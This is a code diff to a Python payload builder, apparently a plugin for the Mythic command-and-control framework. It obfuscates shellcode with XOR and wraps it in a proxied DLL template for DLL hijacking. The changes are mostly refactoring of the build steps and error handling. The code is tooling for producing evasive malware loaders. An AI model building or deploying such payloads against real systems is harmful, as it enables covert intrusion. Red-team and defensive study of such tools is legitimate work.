@@ -122,6 +122,7 @@ NOTE: Only supports XOR for now.
 NOTE: Does not (currently) support encoded or compressed payloads.
 """,
             hide_conditions = [
+                # Change this if you are using a custom DLL Loader written in another language
                 HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
             ]
         ),
@@ -271,26 +272,6 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                   step_description = "Adding payload into chosen container"),
     ]
 
-    async def prepare_dllproxy(self, dll_target, shellcode: str):
-        """Prepare DLL Template with proxied functions and shellcode
-
-        Args:
-            dll_target (UUID): Uploaded DLL File to Proxy
-            shellcode (str): Shellcode
-
-        Raises:
-            Exception: Unknown File Error
-        """
-        file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
-            AgentFileID=dll_target
-        ))
-
-        if not file_content.Success:
-            raise Exception(f"[-] Failed to get file content: {file_content.Error}")
-
-        pragmas = generate_proxies(file_content.Content)
-        return pragmas
-
     def generate_payload(self):
         """Creates a payload based on the provided shellcode/agent
 
@@ -359,7 +340,10 @@ NOTE: Does not (currently) support encoded or compressed payloads.
             payload_path = str(payload_path)
 
             templates_path = PurePath(agent_build_path) / "templates"
+            dll_template_path = templates_path / "dll_template.cpp"
             templates_path = str(templates_path)
+            dll_template_path = str(dll_template_path)
+
 
             environment = Environment(loader=FileSystemLoader(templates_path))
 
@@ -449,17 +433,6 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                 response.build_message = "Failed to obfuscate shellcode."
                 response.build_stderr = output + "\n" + obfuscated_shellcode_path
                 return response
-            elif proc.returncode != 0:
-                response.payload = b""
-                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="Shellcode Obfuscation",
-                    StepStdout="Failed to obfuscate shellcode",
-                    StepSuccess=False,
-                ))
-                response.build_message = "Failed to obfuscate shellcode."
-                response.build_stderr = output + "\n" + obfuscated_shellcode_path
-                return response
 
             if self.get_parameter("Shellcode Format") == "Raw":
                 # Remove this line to continue to the next exec cycle (Triggers, Containers, etc.)
@@ -482,9 +455,16 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                     StepStdout="Obfuscating Shellcode - Continuing to Next Step",
                     StepSuccess=True,
                 ))
+            output = ""
 
-            pragmas = await self.prepare_dllproxy(dll_target=self.get_parameter("DLL Hijacking"),
-                shellcode=obfuscated_shellcode_path)
+            file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+                AgentFileID=self.get_parameter("DLL Hijacking")
+            ))
+
+            if not file_content.Success:
+                raise Exception(f"[-] Failed to get file content: {file_content.Error}")
+
+            pragmas = await generate_proxies(dllfile=file_content)
 
             dll_placeholder = {
                 "PRAGMAS": pragmas,
@@ -497,7 +477,7 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                 file.write(file_content)
 
             # Check if the file size stayed the same as the template
-            if os.stat(f"{templates_path}/dll_template.cpp")[6] == 1598:
+            if os.stat(dll_template_path)[6] == 1598:
                 response.status = BuildStatus.Error
                 response.build_message = "Failed to proxy the given file."
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -509,7 +489,7 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                 return response
             else:
                 # Debugging
-                response.payload = open(f"{templates_path}/dll_template.cpp", "rb").read()
+                response.payload = open(dll_template_path, "r").read()
 
                 response.status = BuildStatus.Success
                 response.build_message = "DLL Proxied! Compiling Payload..."
